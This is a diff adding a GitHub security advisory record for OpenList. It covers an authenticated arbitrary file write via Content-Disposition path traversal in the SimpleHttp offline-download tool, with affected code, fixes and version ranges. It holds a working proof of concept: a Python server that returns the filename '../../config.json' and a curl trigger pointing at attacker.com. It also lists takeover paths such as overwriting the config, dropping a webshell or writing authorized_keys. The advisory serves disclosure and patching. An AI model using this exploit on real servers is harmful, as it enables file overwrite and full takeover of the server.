@@ -1,0 +1,54 @@
+{
+  "id": "GHSA-h6cj-26g5-67fv",
+  "modified": "2026-09-03T17:45:05.452373363Z",
+  "published": "2026-09-03T17:37:20Z",
+  "aliases": [
+    "CVE-2026-75602"
+  ],
+  "summary": "OpenList: Authenticated arbitrary file write via Content-Disposition path traversal in SimpleHttp offline-download tool",
+  "details": "### Summary\n\nAlist's offline-download feature (`POST /api/fs/add_offline_download` with `tool: \"SimpleHttp\"`) accepts an attacker-supplied URL, fetches it, and saves the bytes under a per-task temp directory before transferring to the user's destination storage. The temp filename is taken from the response's `Content-Disposition` header (attacker-controlled when the URL points to an attacker HTTP server), passed verbatim to `filepath.Join(tempDir, filename)`, and written via `os.Create` with no containment check. Go's `filepath.Join` calls `Clean` on the result, which collapses `..` segments and lets the attacker traverse out of `tempDir` to write any file the alist process can write.\n\nA non-admin user with `PermAddOfflineDownload` permission on any path is sufficient.\n\n### Affected code\n\n`internal/offline_download/http/util.go` — filename returned verbatim from header:\n\n```go\nfunc parseFilenameFromContentDisposition(contentDisposition string) (string, error) {\n    if contentDisposition == \"\" {\n        return \"\", fmt.Errorf(\"Content-Disposition is empty\")\n    }\n    _, params, err := mime.ParseMediaType(contentDisposition)\n    if err != nil {\n        return \"\", err\n    }\n    filename := params[\"filename\"]\n    if filename == \"\" {\n        return \"\", fmt.Errorf(\"filename not found in Content-Disposition: [%s]\", contentDisposition)\n    }\n    return filename, nil   // ← no traversal stripping\n}\n```\n\n`internal/offline_download/http/client.go` (`SimpleHttp.Run`):\n\n```go\nfilename := path.Base(urlPath)                                         // safe\nif n, err := parseFilenameFromContentDisposition(resp.Header.Get(\"Content-Disposition\")); err == nil {\n    filename = n                                                       // UNSAFE — no sanitization\n}\n_ = os.MkdirAll(task.TempDir, os.ModePerm)\nfilePath := filepath.Join(task.TempDir, filename)                      // filepath.Join calls Clean; \"../\" escapes tempDir\nfile, err := os.Create(filePath)                                       // arbitrary file create+truncate\n_, _ = utils.CopyWithCtx(task.Ctx(), file, resp.Body, fileSize, task.SetProgress)\n```\n\n`server/handles/offline_download.go` (`AddOfflineDownload`) is mounted under normal user auth (not `AuthAdmin`). The only permission check is `common.HasPermission(perm, common.PermAddOfflineDownload)`.\n\nNote: `tryPutUrl` in `internal/offline_download/tool/add.go` is a partial bypass for cloud-storage destinations whose driver implements `PutURL` (e.g., 115 Cloud, PikPak, Thunder). For the local-storage driver — the most common target — `tryPutUrl` returns `errs.NotImplement` and execution falls through to the vulnerable `SimpleHttp.Run` path.\n\n### PoC\n\n1. Attacker has any alist account with `PermAddOfflineDownload` on some path it can write to (e.g. `/somefolder`).\n2. Attacker hosts a small HTTP listener:\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nPAYLOAD = b\"any_attacker_controlled_bytes\\n\"\nTRAVERSAL = \"../../config.json\"   # destination path under /opt/alist/data/\nclass H(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-Disposition\", f'attachment; filename=\"{TRAVERSAL}\"')\n        self.send_header(\"Content-Length\", str(len(PAYLOAD)))\n        self.end_headers()\n        self.wfile.write(PAYLOAD)\nHTTPServer((\"0.0.0.0\", 80), H).serve_forever()\n```\n\n3. Trigger:\n\n```bash\ncurl -X POST 'http://victim-alist.example/api/fs/add_offline_download' \\\n  -H 'Authorization: \u003csession-token\u003e' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"urls\":[\"http://attacker.com/payload\"],\"tool\":\"SimpleHttp\",\"path\":\"/somefolder\",\"delete_policy\":\"delete_never\"}'\n```\n\n4. Server-side: `tempDir = /opt/alist/data/temp/SimpleHttp/\u003cuuid\u003e`. `filename = \"../../config.json\"`. `filePath = filepath.Join(tempDir, filename)` cleans to `/opt/alist/data/config.json`. `os.Create` truncates the existing config; the response body is streamed in.\n\n### Impact\n\nThe minimal, deployment-agnostic guarantee is: the attacker can cause the application to create or overwrite files whose parent directory exists, with content of their choice, **as the alist process** (PUID=0 in default Docker). Because the vulnerable code ultimately calls `os.Create` on the attacker-controlled resolved path, existing files may be truncated and replaced when the target already exists. Concrete impact paths include:\n\n- **Replace `/opt/alist/data/config.json`** with attacker config (alternative JwtSecret, admin password hash, allowed origins) — admin takeover on next restart / config-reload hook.\n- **Drop a webshell** into a writable docroot served by a sibling web server (environment-dependent).\n- **Truncate the alist binary** at `/opt/alist/alist` (Linux permits overwriting an executing binary on most filesystems) — next start runs attacker's binary.\n- **Write `authorized_keys`** if a host volume bind-mounts e.g. `/root/.ssh` and that directory exists.\n\nCaveat: the parent directory of the target must already exist; `os.Create` does not `mkdir -p` intermediate components. This still leaves many high-impact targets reachable on default deployments.\n\n### Adversarial review notes\n\n- `filepath.Join` *does* collapse `..` (Go semantics confirmed via stdlib).\n- No containment check exists after the join.\n- `mime.ParseMediaType` does not strip path separators or `..` from `filename` or RFC 5987 `filename*`.\n- The resolved path is opened using `os.Create`, which truncates existing files and therefore permits overwrite in addition to creation when the target path already exists.\n- `SimpleHttp` is registered by default (`internal/offline_download/all.go`).\n- The route is *not* `AuthAdmin`-gated.\n- Default guest is disabled (perm 0); this requires a user with `PermAddOfflineDownload`.\n\n### Remediation\n\nMinimal patch in `internal/offline_download/http/util.go`:\n\n```go\nfilename = filepath.Base(filename)\nif filename == \"\" || filename == \".\" || filename == \"..\" || !filepath.IsLocal(filename) {\n    return \"\", fmt.Errorf(\"invalid filename in Content-Disposition: [%s]\", contentDisposition)\n}\nreturn filename, nil\n```\n\nDefense-in-depth in `internal/offline_download/http/client.go` after computing `filePath`:\n\n```go\ncleanTempDir := filepath.Clean(task.TempDir) + string(filepath.Separator)\nif !strings.HasPrefix(filepath.Clean(filePath)+string(filepath.Separator), cleanTempDir) {\n    return fmt.Errorf(\"filename escapes temp dir\")\n}\n```\n\nAdditionally, file creation should reject existing targets (or use an equivalent exclusive-create mechanism) to prevent accidental or attacker-controlled overwrites when a chosen filename resolves to an existing file.\n\n```go\nif _, err := os.Stat(filePath); err == nil {\n    return fmt.Errorf(\"file already exists\")\n}\n```\n\nThe same Content-Disposition / URL-derived filename trust pattern should be reviewed in the other offline-download tools under `internal/offline_download/{aria2,qbit,transmission,115,pikpak,thunder}/` for consistency.\n\n### Inherited from upstream\n\nThis bug is inherited from upstream alist/alist-org/alist. Sister advisories are being filed against AlistGo/alist (the active downstream) and alist-org/alist (the original tree).\n\n### Cross-reference\n\nThis is a different code path from the previously fixed CVE-2026-25161 (GHSA-x4q4-7phh-42j9, fsmanage/fsbatch path traversal patched in v3.57.0). The offline-download `SimpleHttp` downloader was not in scope of that fix; the vulnerable code is on `main` HEAD as of the time of this report (verified against the openlistteam/openlist tree's `internal/offline_download/http/client.go` retrieved 2026-05-09 — the SimpleHttp.Run function still calls `parseFilenameFromContentDisposition` and uses the result verbatim with `filepath.Join(task.TempDir, filename)`. OpenList's variant adds a `strings.Trim(filename, \"/\")` call which strips leading/trailing slashes but does NOT block `..` traversal segments — so the bug remains exploitable.)\n\n### Credit\n\nDiscovered during a cross-target meta-sweep on path-traversal in file-upload / download pipelines. Static review of public source; no live exploitation.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/OpenListTeam/OpenList",
+        "purl": "pkg:golang/github.com/OpenListTeam/OpenList"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.2.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 4.2.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-h6cj-26g5-67fv/GHSA-h6cj-26g5-67fv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/OpenListTeam/OpenList/security/advisories/GHSA-h6cj-26g5-67fv"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/OpenListTeam/OpenList/commit/9cc5dd969b9833c8cb4e14c338c3571dfdbe2108"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/OpenListTeam/OpenList"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/OpenListTeam/OpenList/releases/tag/v4.2.3"
+    }
+  ]
+}
